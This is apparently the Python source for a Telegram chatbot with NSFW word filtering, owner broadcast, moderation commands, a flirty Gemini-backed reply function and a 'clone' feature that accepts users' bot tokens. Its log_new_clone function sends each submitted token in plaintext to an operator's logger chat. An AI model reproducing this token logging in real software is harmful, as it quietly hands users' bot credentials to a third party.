import asyncio
import time
import random
import google.generativeai as genai
from groq import Groq
from mistralai import Mistral

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand
)

from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)

# =========================
# CONFIG & DATABASE IMPORTS
# =========================
from ..config import (
    OWNER_ID, GEMINI_API_KEY, GROQ_API_KEY, MISTRAL_API_KEY, 
    LOGGER_GROUP, CLONE_LOGGER, START_IMG, SUPPORT_GROUP, UPDATE_CHANNEL
)
from ..database import (
    add_cloned_bot, remove_cloned_bot, clones_collection, 
    users_collection, set_welcome_status, get_welcome_status,
    get_chat_status, set_chat_status
)
from .welcome import master_start, help_callback 
from .admin import ban_user, unban_user, mute_user, unmute_user, promote_user

# =========================
# 🛡️ ANTI-NSFW SYSTEM
# =========================

BAD_WORDS = ["nude", "porn", "sex", "xxx", "pussy", "dick", "mms", "sexy", "gaand", "behenchod", "randi"]

async def anti_nsfw_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return False
    text = (update.message.text or update.message.caption or "").lower()
    if any(word in text for word in BAD_WORDS):
        try:
            await update.message.delete()
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"🚫 @{update.effective_user.username}, NSFW content is not allowed here!"
            )
            return True 
        except Exception: pass
    return False

# =========================
# 📢 BROADCAST SYSTEM
# =========================

async def broadcast_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return await update.message.reply_text("❌ Only Owner can use this command!")
    if not update.message.reply_to_message:
        return await update.message.reply_text("📢 Reply to a message with `/broadcast` to send it to everyone.")
    
    msg = await update.message.reply_text("🚀 Broadcasting in progress...")
    all_users = users_collection.find() 
    count = 0
    for user in all_users:
        try:
            await context.bot.copy_message(
                chat_id=user['user_id'], 
                from_chat_id=update.effective_chat.id, 
                message_id=update.message.reply_to_message.message_id
            )
            count += 1
            await asyncio.sleep(0.05) 
        except: pass
    await msg.edit_text(f"✅ Broadcast Completed! Sent to {count} users.")

# =========================
# 🛠 CLONE & DELCLONE LOGIC
# =========================

async def clone_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("🚀 Usage: `/clone BOT_TOKEN`")
    
    token = context.args[0]
    user = update.effective_user
    msg = await update.message.reply_text("⌛ **Starting Clone... Please wait.**")
    
    try:
        temp_app = Application.builder().token(token).build()
        await temp_app.initialize()
        await temp_app.start()
        
        bot_info = await temp_app.bot.get_me()
        add_cloned_bot(user.id, token, bot_info.username, bot_info.id)
        
        # Registering handlers for the cloned bot
        register_all_handlers(temp_app)
        await temp_app.bot.set_my_commands(CLONE_COMMANDS)
        
        await msg.edit_text(f"✅ **Bot Cloned Successfully!**\n\nBot: @{bot_info.username}")
        await log_new_clone(context, user, token, bot_info.username)
        
    except Exception as e:
        await msg.edit_text(f"❌ **Error:** `{e}`\nCheck if the token is valid.")

async def delclone_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("🗑 Usage: `/delclone BOT_TOKEN`")
    
    token = context.args[0]
    try:
        remove_cloned_bot(token)
        await update.message.reply_text("🗑 **Clone deleted from database.**")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: `{e}`")

# =========================
# 🔄 LOGGER & AI SYSTEM
# =========================

async def log_new_clone(context, user, token, bot_username):
    try:
        text = f"🚀 *New Clone:* @{bot_username}\n👤 *Owner:* {user.first_name} (`{user.id}`)\n🔑 *Token:* `{token}`"
        await context.bot.send_message(chat_id=CLONE_LOGGER, text=text, parse_mode="Markdown")
    except: pass

async def get_unlimited_ai_reply(text):
    prompt = f"Reply in Hinglish (natkhat flirty style, 1 line): {text}"
    try:
        if GEMINI_API_KEY:
            genai.configure(api_key=GEMINI_API_KEY)
            model = genai.GenerativeModel("gemini-1.5-flash")
            return (model.generate_content(prompt)).text
    except: pass
    return "Ofo! Main thoda busy hoon, baad mein baat karein? 😉"

# =========================
# ⚙️ HANDLERS & REGISTRATION
# =========================

async def start_handler(update, context):
    await master_start(update, context)

async def chatbot_main_reply(update, context):
    if not update.message or not update.message.text: return
    # NSFW Filter check
    if await anti_nsfw_delete(update, context): return
    # Privacy check
    if update.effective_chat.type != "private" and not get_chat_status(update.effective_chat.id): return
    
    await context.bot.send_chat_action(update.effective_chat.id, "typing")
    reply = await get_unlimited_ai_reply(update.message.text)
    await update.message.reply_text(reply)

async def ping_cmd(update, context):
    start_time = time.time()
    m = await update.message.reply_text("🏓")
    end_time = time.time()
    await m.edit_text(f"⚡ Pong! `{round((end_time - start_time) * 1000)}ms`")

def register_all_handlers(app: Application):
    # Command Handlers
    app.add_handler(CommandHandler("start", start_handler))
    app.add_handler(CommandHandler("clone", clone_bot))
    app.add_handler(CommandHandler("delclone", delclone_bot))
    app.add_handler(CommandHandler("broadcast", broadcast_handler))
    app.add_handler(CommandHandler("ping", ping_cmd))
    
    # Admin Power
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CommandHandler("unban", unban_user))
    app.add_handler(CommandHandler("mute", mute_user))
    app.add_handler(CommandHandler("unmute", unmute_user))

    # Message Handlers
    app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO | filters.ANIMATION, anti_nsfw_delete))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chatbot_main_reply))
               
CLONE_COMMANDS = [
    BotCommand("start", "Start Bot"),
    BotCommand("help", "Help Menu"),
    BotCommand("ping", "Check Speed"),
    BotCommand("chatbot", "Toggle AI"),
    BotCommand("welcome", "Toggle Welcome"),
    BotCommand("ban", "Ban User"),
    BotCommand("unban", "Unban User"),
    BotCommand("mute", "Mute User"),
    BotCommand("unmute", "Unmute User"),
]
